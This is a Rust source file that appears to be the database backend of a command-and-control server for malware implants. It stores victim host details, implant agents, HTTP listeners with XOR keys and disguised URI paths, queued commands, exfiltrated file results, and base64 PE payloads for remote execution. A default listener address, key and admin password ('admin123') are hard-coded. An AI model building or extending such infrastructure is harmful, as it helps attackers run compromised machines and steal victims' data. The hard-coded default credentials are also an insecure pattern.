use crate::admin::models::*;
use bcrypt::{hash, DEFAULT_COST};
use chrono::Utc;
use rusqlite::{Connection, OptionalExtension, Result as SqlResult};
use std::{collections::HashMap, string};
pub struct Database {
    path: String,
}

impl Database {
    pub fn new(path: &str) -> Self {
        Database {
            path: path.to_string(),
        }
    }

    pub fn init(&self) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;

        let schema = r#"
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_login DATETIME
            );

            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                token TEXT UNIQUE NOT NULL,
                username TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME NOT NULL,
                ip_address TEXT,
                FOREIGN KEY (username) REFERENCES users(username) ON DELETE CASCADE
            );

            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL UNIQUE,
                type TEXT NOT NULL,
                users TEXT,
                file_path TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (users) REFERENCES users(username) ON DELETE SET NULL
            );

            CREATE TABLE IF NOT EXISTS agents_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                action TEXT NOT NULL,
                details TEXT,
                username TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (username) REFERENCES users(username) ON DELETE SET NULL
            );


            CREATE TABLE IF NOT EXISTS listeners (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT UNIQUE NOT NULL,
                listener_type TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER NOT NULL,
                xor_key TEXT NOT NULL,
                user_agent TEXT NOT NULL,
                uri_paths TEXT NOT NULL,     -- stocké tel quel depuis le frontend
                http_headers TEXT NOT NULL,  -- stocké tel quel depuis le frontend
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS victim_info (
                agent_id TEXT PRIMARY KEY,
                hostname TEXT NOT NULL,
                username TEXT NOT NULL,
                os TEXT NOT NULL,
                ip_address TEXT NOT NULL,
                process_name TEXT NOT NULL,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
            );

            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT NOT NULL DEFAULT 'pending',  -- pending, sent, completed, failed
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                sent_at DATETIME,
                completed_at DATETIME
            );

            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command_id INTEGER,
                output TEXT NOT NULL,
                success BOOLEAN NOT NULL,
                types TEXT NOT NULL DEFAULT 'text',
                filename TEXT,
                received_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (command_id) REFERENCES commands(id) ON DELETE SET NULL
            );

            CREATE TABLE IF NOT EXISTS pe_exec_data (
                command_id INTEGER NOT NULL,
                pe_data TEXT NOT NULL,  -- JSON base64: {'content':'...','args':'...'}
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (command_id) REFERENCES commands(id) ON DELETE CASCADE
            );

            CREATE INDEX IF NOT EXISTS idx_pe_exec_command ON pe_exec_data(command_id);
            CREATE INDEX IF NOT EXISTS idx_listeners_name ON listeners(name);
            CREATE INDEX IF NOT EXISTS idx_listeners_port ON listeners(port);
            CREATE INDEX IF NOT EXISTS idx_listeners_type ON listeners(listener_type);

            ---------------------------------------------------
            -- Existing Indexes
            ---------------------------------------------------
            CREATE INDEX IF NOT EXISTS idx_agent_id ON agents_log(agent_id);
            CREATE INDEX IF NOT EXISTS idx_timestamp ON agents_log(timestamp);
            CREATE INDEX IF NOT EXISTS idx_username_log ON agents_log(username);

            CREATE INDEX IF NOT EXISTS idx_token ON sessions(token);
            CREATE INDEX IF NOT EXISTS idx_expires_at ON sessions(expires_at);
            CREATE INDEX IF NOT EXISTS idx_username_sessions ON sessions(username);

            CREATE INDEX IF NOT EXISTS idx_users_agents ON agents(users);

            -- New Indexes for commands and results
            CREATE INDEX IF NOT EXISTS idx_commands_agent_id ON commands(agent_id);
            CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
            CREATE INDEX IF NOT EXISTS idx_results_agent_id ON results(agent_id);
            CREATE INDEX IF NOT EXISTS idx_results_command_id ON results(command_id);
        "#;

        conn.execute_batch(schema)?;
        self.create_default_admin()?;
        self.create_system_user()?;

        log::info!("[+] Database schema initialized successfully");
        Ok(())
    }

    fn create_system_user(&self) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;

        let system_exists: bool = conn
            .query_row(
                "SELECT EXISTS(SELECT 1 FROM users WHERE username = 'system')",
                [],
                |row| row.get(0),
            )
            .unwrap_or(false);

        if !system_exists {
            let system_password = format!("system_{}", uuid::Uuid::new_v4());
            let hashed = hash(&system_password, DEFAULT_COST)
                .map_err(|e| rusqlite::Error::ToSqlConversionFailure(Box::new(e)))?;

            conn.execute(
                "INSERT INTO users (username, password_hash) VALUES (?1, ?2)",
                rusqlite::params!["system", hashed],
            )?;

            log::info!("[+] System user created for auto-registered agents");
        }

        Ok(())
    }

    pub fn update_victim_info(
        &self,
        agent_id: &str,
        hostname: &str,
        username: &str,
        os: &str,
        ip_address: &str,
        process_name: &str,
    ) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;

        conn.execute(
            "INSERT INTO victim_info (
                agent_id, hostname, username, os, ip_address, process_name, last_seen
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, CURRENT_TIMESTAMP)
            ON CONFLICT(agent_id) DO UPDATE SET
                hostname = ?2,
                username = ?3,
                os = ?4,
                ip_address = ?5,
                process_name = ?6,
                last_seen = CURRENT_TIMESTAMP",
            rusqlite::params![agent_id, hostname, username, os, ip_address, process_name,],
        )?;

        Ok(())
    }

    pub fn get_victim_details(&self, agent_id: &str) -> SqlResult<Option<VictimAgentDetails>> {
        let conn = Connection::open(&self.path)?;

        let mut stmt = conn.prepare(
            "SELECT agent_id, hostname, username, os, ip_address, process_name,
                    first_seen, last_seen
             FROM victim_info
             WHERE agent_id = ?1",
        )?;

        let mut rows = stmt.query([agent_id])?;

        if let Some(row) = rows.next()? {
            Ok(Some(VictimAgentDetails {
                agent_id: row.get(0)?,
                hostname: row.get(1)?,
                username: row.get(2)?,
                os: row.get(3)?,
                ip_address: row.get(4)?,
                process_name: row.get(5)?,
                first_seen: row.get(6)?,
                last_seen: row.get(7)?,
            }))
        } else {
            Ok(None)
        }
    }

    pub fn get_all_victims(&self) -> SqlResult<Vec<VictimAgentDetails>> {
        let conn = Connection::open(&self.path)?;

        let mut stmt = conn.prepare(
            "SELECT agent_id, hostname, username, os, ip_address, process_name,
                    first_seen, last_seen
             FROM victim_info
             ORDER BY last_seen DESC",
        )?;

        let victims = stmt
            .query_map([], |row| {
                Ok(VictimAgentDetails {
                    agent_id: row.get(0)?,
                    hostname: row.get(1)?,
                    username: row.get(2)?,
                    os: row.get(3)?,
                    ip_address: row.get(4)?,
                    process_name: row.get(5)?,
                    first_seen: row.get(6)?,
                    last_seen: row.get(7)?,
                })
            })?
            .collect::<Result<Vec<_>, _>>()?;

        Ok(victims)
    }

    pub fn add_default_listener(&self) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;

        let listener = Listener {
            name: "http".to_string(),
            listener_type: "http".to_string(),
            host: "172.20.167.237".to_string(),
            port: 80,
            xor_key: "mysupersecretkey".to_string(),
            user_agent: "Mozilla/5.0".to_string(),
            uri_paths: "/api/update".to_string(),
            http_headers: {
                let mut h = HashMap::new();
                h.insert("Accept".to_string(), "application/json".to_string());
                h
            },
        };

        let http_headers_json = serde_json::to_string(&listener.http_headers)
            .map_err(|e| rusqlite::Error::ToSqlConversionFailure(Box::new(e)))?;

        conn.execute(
            "INSERT OR IGNORE INTO listeners (name, listener_type, host, port, xor_key, user_agent, uri_paths, http_headers)
            VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            rusqlite::params![
                listener.name,
                listener.listener_type,
                listener.host,
                listener.port,
                listener.xor_key,
                listener.user_agent,
                listener.uri_paths,
                http_headers_json
            ],
        )?;

        log::info!(
            "[+] Default HTTP listener added to database: {}:{}",
            listener.host,
            listener.port
        );
        Ok(())
    }

    fn create_default_admin(&self) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;

        let admin_exists: bool = conn
            .query_row(
                "SELECT EXISTS(SELECT 1 FROM users WHERE username = 'admin')",
                [],
                |row| row.get(0),
            )
            .unwrap_or(false);

        if !admin_exists {
            let default_password = "admin123";
            let hashed = hash(default_password, DEFAULT_COST)
                .map_err(|e| rusqlite::Error::ToSqlConversionFailure(Box::new(e)))?;

            conn.execute(
                "INSERT INTO users (username, password_hash) VALUES (?1, ?2)",
                rusqlite::params!["admin", hashed],
            )?;

            log::warn!("[!] Default admin user created (username: admin, password: admin123)");
            log::warn!("[!] CHANGE THIS PASSWORD IMMEDIATELY IN PRODUCTION!");
        }

        Ok(())
    }

    pub fn verify_user(&self, username: &str, password: &str) -> SqlResult<bool> {
        let conn = Connection::open(&self.path)?;

        let password_hash: String = match conn.query_row(
            "SELECT password_hash FROM users WHERE username = ?1",
            [username],
            |row| row.get(0),
        ) {
            Ok(hash) => hash,
            Err(_) => return Ok(false),
        };

        match bcrypt::verify(password, &password_hash) {
            Ok(valid) => {
                if valid {
                    let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
                    let _ = conn.execute(
                        "UPDATE users SET last_login = ?1 WHERE username = ?2",
                        rusqlite::params![now, username],
                    );
                }
                Ok(valid)
            }
            Err(_) => Ok(false),
        }
    }

    pub fn store_session(
        &self,
        token: &str,
        username: &str,
        expires_at: &str,
        ip: Option<&str>,
    ) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;
        conn.execute(
            "INSERT INTO sessions (token, username, expires_at, ip_address) VALUES (?1, ?2, ?3, ?4)",
            rusqlite::params![token, username, expires_at, ip],
        )?;
        Ok(())
    }

    pub fn is_session_valid(&self, token: &str) -> bool {
        let conn = match Connection::open(&self.path) {
            Ok(c) => c,
            Err(_) => return false,
        };

        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();

        conn.query_row(
            "SELECT EXISTS(SELECT 1 FROM sessions WHERE token = ?1 AND expires_at > ?2)",
            rusqlite::params![token, now],
            |row| row.get(0),
        )
        .unwrap_or(false)
    }

    pub fn clean_expired_sessions(&self) -> SqlResult<usize> {
        let conn = Connection::open(&self.path)?;
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        conn.execute("DELETE FROM sessions WHERE expires_at < ?1", [&now])
    }

    pub fn delete_session(&self, token: &str) -> SqlResult<usize> {
        let conn = Connection::open(&self.path)?;
        conn.execute("DELETE FROM sessions WHERE token = ?1", [token])
    }

    pub fn log_agent_action(
        &self,
        agent_id: &str,
        action: &str,
        details: Option<&str>,
        username: Option<&str>,
    ) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;
        conn.execute(
            "INSERT INTO agents_log (agent_id, action, details, username) VALUES (?1, ?2, ?3, ?4)",
            rusqlite::params![agent_id, action, details, username],
        )?;
        Ok(())
    }

    pub fn add_agents(
        &self,
        agent_id: &str,
        agent_type: &str,
        username: &str,
        file_path: Option<&str>,
    ) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;
        conn.execute(
            "INSERT INTO agents (agent_id, type, users, file_path) VALUES (?1, ?2, ?3, ?4)",
            rusqlite::params![agent_id, agent_type, username, file_path],
        )?;
        log::info!(
            "[+] Agent {} registered in database for user {} (saved at: {:?})",
            agent_id,
            username,
            file_path
        );
        Ok(())
    }

    pub fn get_agent(
        &self,
        agent_id: &str,
    ) -> SqlResult<Option<(String, String, Option<String>, Option<String>)>> {
        let conn = Connection::open(&self.path)?;
        match conn.query_row(
            "SELECT agent_id, type, users, file_path FROM agents WHERE agent_id = ?1",
            [agent_id],
            |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, row.get(3)?)),
        ) {
            Ok(agent) => Ok(Some(agent)),
            Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
            Err(e) => Err(e),
        }
    }

    pub fn add_listener(
        &self,
        name: &str,
        listener_type: &str,
        host: &str,
        port: u16,
        xor_key: &str,
        user_agent: &str,
        uri_paths: &str,
        http_headers: &str,
    ) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;
        conn.execute(
            "INSERT INTO listeners (name, listener_type, host, port, xor_key, user_agent, uri_paths, http_headers)
            VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
            rusqlite::params![name, listener_type, host, port, xor_key, user_agent, uri_paths, http_headers],
        )?;
        log::info!(
            "[+] Listener '{}' added to database on {}:{}",
            name,
            host,
            port
        );
        Ok(())
    }

    pub fn get_listener(&self, name: &str) -> SqlResult<Option<Listener>> {
        let conn = Connection::open(&self.path)?;

        match conn.query_row(
            "SELECT name, listener_type, host, port, xor_key, user_agent, uri_paths, http_headers
            FROM listeners WHERE name = ?1",
            [name],
            |row| {
                let http_headers_str: String = row.get(7)?;
                let http_headers: HashMap<String, String> =
                    serde_json::from_str(&http_headers_str).unwrap_or_else(|_| HashMap::new());

                Ok(Listener {
                    name: row.get(0)?,
                    listener_type: row.get(1)?,
                    host: row.get(2)?,
                    port: row.get(3)?,
                    xor_key: row.get(4)?,
                    user_agent: row.get(5)?,
                    uri_paths: row.get(6)?,
                    http_headers,
                })
            },
        ) {
            Ok(listener) => Ok(Some(listener)),
            Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
            Err(e) => Err(e),
        }
    }

    pub fn get_listeners(&self) -> SqlResult<Vec<Listener>> {
        let conn = Connection::open(&self.path)?;
        let mut stmt = conn.prepare(
            "SELECT name, listener_type, host, port, xor_key, user_agent, uri_paths, http_headers FROM listeners"
        )?;

        let rows = stmt.query_map([], |row| {
            let http_headers_str: String = row.get(7)?;
            let http_headers: HashMap<String, String> =
                serde_json::from_str(&http_headers_str).unwrap_or_else(|_| HashMap::new());

            Ok(Listener {
                name: row.get(0)?,
                listener_type: row.get(1)?,
                host: row.get(2)?,
                port: row.get(3)?,
                xor_key: row.get(4)?,
                user_agent: row.get(5)?,
                uri_paths: row.get(6)?,
                http_headers,
            })
        })?;

        rows.collect()
    }

    // ==========================================
    // NOUVELLES MÉTHODES POUR COMMANDS
    // ==========================================

    /// Ajouter une commande pour un agent
    pub fn add_command(&self, agent_id: &str, command: &str) -> SqlResult<i64> {
        let conn = Connection::open(&self.path)?;
        conn.execute(
            "INSERT INTO commands (agent_id, command, status) VALUES (?1, ?2, 'pending')",
            rusqlite::params![agent_id, command],
        )?;
        let command_id = conn.last_insert_rowid();
        log::info!(
            "[+] Command added for agent {}: {} (ID: {})",
            agent_id,
            command,
            command_id
        );
        Ok(command_id)
    }

    /// Récupérer les commandes en attente pour un agent
    pub fn get_pending_commands(&self, agent_id: &str) -> SqlResult<Vec<(i64, String)>> {
        let conn = Connection::open(&self.path)?;
        let mut stmt = conn.prepare(
            "SELECT id, command FROM commands
             WHERE agent_id = ?1 AND status = 'pending'
             ORDER BY created_at ASC",
        )?;

        let commands = stmt
            .query_map([agent_id], |row| Ok((row.get(0)?, row.get(1)?)))?
            .collect::<Result<Vec<_>, _>>()?;

        Ok(commands)
    }

    /// Marquer une commande comme envoyée
    pub fn mark_command_sent(&self, command_id: i64) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        conn.execute(
            "UPDATE commands SET status = 'sent', sent_at = ?1 WHERE id = ?2",
            rusqlite::params![now, command_id],
        )?;
        log::debug!("[+] Command {} marked as sent", command_id);
        Ok(())
    }

    /// Marquer une commande comme complétée
    pub fn mark_command_completed(&self, command_id: i64) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        conn.execute(
            "UPDATE commands SET status = 'completed', completed_at = ?1 WHERE id = ?2",
            rusqlite::params![now, command_id],
        )?;
        log::debug!("[+] Command {} marked as completed", command_id);
        Ok(())
    }

    /// Marquer une commande comme échouée
    pub fn mark_command_failed(&self, command_id: i64) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;
        let now = Utc::now().format("%Y-%m-%d %H:%M:%S").to_string();
        conn.execute(
            "UPDATE commands SET status = 'failed', completed_at = ?1 WHERE id = ?2",
            rusqlite::params![now, command_id],
        )?;
        log::debug!("[+] Command {} marked as failed", command_id);
        Ok(())
    }

    /// Stocker un résultat de commande (stockage en Base64 direct)
    pub fn store_result(
        &self,
        agent_id: &str,
        command_id: Option<i64>,
        output: &str,
        success: bool,
        result_type: Option<&str>,
    ) -> SqlResult<i64> {
        let conn = Connection::open(&self.path)?;

        let result_type = result_type.unwrap_or("text"); // si rien, c'est un texte

        // ===== NOUVEAU: Extraire le nom de fichier si c'est une commande download =====
        let mut filename: Option<String> = None;

        if let Some(cmd_id) = command_id {
            if let Ok(Some(cmd_str)) = self.get_command_by_id(cmd_id) {
                // Le get_command_by_id retourne maintenant la commande complète
                if let Some(parsed_filename) = Self::extract_filename_from_command(&cmd_str) {
                    filename = Some(parsed_filename);
                    log::info!(
                        "[DB] Extracted filename from command {}: {:?}",
                        cmd_id,
                        filename
                    );
                }
            }
        }

        conn.execute(
            "INSERT INTO results (agent_id, command_id, output, success, types, filename) VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            rusqlite::params![agent_id, command_id, output, success, result_type, filename],
        )?;

        let result_id = conn.last_insert_rowid();

        if let Some(cmd_id) = command_id {
            if success {
                self.mark_command_completed(cmd_id)?;
            } else {
                self.mark_command_failed(cmd_id)?;
            }
        }

        log::info!(
            "[+] Result stored (Base64) for agent {} (command_id: {:?}, success: {}, types: {}, filename: {:?}, result_id: {}, length: {})",
            agent_id, command_id, success, result_type, filename, result_id, output.len()
        );

        Ok(result_id)
    }

    // ===== NOUVELLE FONCTION: Extraire le nom de fichier d'une commande =====
    pub fn extract_filename_from_command(command: &str) -> Option<String> {
        // Format attendu: 'download':'filename.ext' ou 'upload':'filename.ext'
        let trimmed = command.trim().trim_matches(|c| c == '{' || c == '}');

        // Vérifier si c'est une commande download/upload
        if !trimmed.contains("download") && !trimmed.contains("upload") {
            return None;
        }

        let colon_pos = trimmed.find(':')?;

        let after_colon = &trimmed[colon_pos + 1..].trim();

        // Enlever les quotes
        let filename = after_colon
            .trim_matches(|c| c == '\'' || c == '"' || c == ' ')
            .to_string();

        if !filename.is_empty() {
            Some(filename)
        } else {
            None
        }
    }

    pub fn get_command_by_id(&self, command_id: i64) -> SqlResult<Option<String>> {
        let conn = Connection::open(&self.path)?;

        match conn.query_row(
            "SELECT command FROM commands WHERE id = ?1",
            [command_id],
            |row| {
                let command_str: String = row.get(0)?;
                Ok(command_str)
            },
        ) {
            Ok(cmd) => Ok(Some(cmd)),
            Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
            Err(e) => Err(e),
        }
    }

    pub fn extract_filename_from_command_id(&self, command_id: i64) -> Option<String> {
        match self.get_command_by_id(command_id) {
            Ok(Some(cmd_str)) => Self::extract_filename_from_command(&cmd_str),
            _ => None,
        }
    }

    pub fn get_result_by_id(&self, result_id: i64) -> SqlResult<Option<ResultDetail>> {
        let conn = Connection::open(&self.path)?;

        match conn.query_row(
            "SELECT id, agent_id, command_id, output, success, received_at, types, filename
            FROM results
            WHERE id = ?1",
            [result_id],
            |row| {
                Ok(ResultDetail {
                    id: row.get(0)?,
                    agent_id: row.get(1)?,
                    command_id: row.get(2)?,
                    output: row.get(3)?,
                    success: row.get(4)?,
                    received_at: row.get(5)?,
                    r#types: row.get(6).ok(),
                    filename: row.get(7).ok(),
                })
            },
        ) {
            Ok(result) => Ok(Some(result)),
            Err(rusqlite::Error::QueryReturnedNoRows) => Ok(None),
            Err(e) => Err(e),
        }
    }

    pub fn get_agent_results(
        &self,
        agent_id: &str,
    ) -> SqlResult<Vec<(i64, Option<i64>, String, bool, String, String)>> {
        let conn = Connection::open(&self.path)?;
        let mut stmt = conn.prepare(
            "SELECT id, command_id, output, success, types, received_at FROM results
            WHERE agent_id = ?1
            ORDER BY received_at DESC",
        )?;

        let results = stmt
            .query_map([agent_id], |row| {
                Ok((
                    row.get(0)?,
                    row.get(1)?,
                    row.get(2)?,
                    row.get(3)?,
                    row.get(4)?,
                    row.get(5)?,
                ))
            })?
            .collect::<Result<Vec<_>, _>>()?;

        Ok(results)
    }

    pub fn get_upload_data_for_command(&self, command_id: i64) -> SqlResult<Option<String>> {
        let conn = Connection::open(&self.path)?;

        match conn.query_row(
            "SELECT output FROM results
            WHERE command_id = ?1 AND types = 'file_upload'
            ORDER BY received_at DESC LIMIT 1",
            [command_id],
            |row| row.get(0),
        ) {
            Ok(data) => {
                log::debug!("[DB] Upload data found for command {}", command_id);
                Ok(Some(data))
            }
            Err(rusqlite::Error::QueryReturnedNoRows) => {
                log::debug!("[DB] No upload data found for command {}", command_id);
                Ok(None)
            }
            Err(e) => Err(e),
        }
    }

    pub fn store_pe_exec_data(&self, command_id: i64, pe_data_b64: &str) -> SqlResult<()> {
        let conn = Connection::open(&self.path)?;

        conn.execute(
            "INSERT INTO pe_exec_data (command_id, pe_data) VALUES (?1, ?2)",
            rusqlite::params![command_id, pe_data_b64],
        )?;

        log::info!(
            "[+] PE-exec data stored for command {} (size: {} bytes)",
            command_id,
            pe_data_b64.len()
        );
        Ok(())
    }
    pub fn get_pe_exec_data_by_command(&self, command_id: i64) -> Result<Option<String>, String> {
        let conn = Connection::open(&self.path).map_err(|e| e.to_string())?;

        let result: Option<String> = conn
            .query_row(
                "SELECT pe_data FROM pe_exec_data WHERE command_id = ?1",
                rusqlite::params![command_id],
                |row| row.get(0),
            )
            .optional()
            .map_err(|e| format!("Failed to query PE-exec data: {}", e))?;

        Ok(result)
    }
}
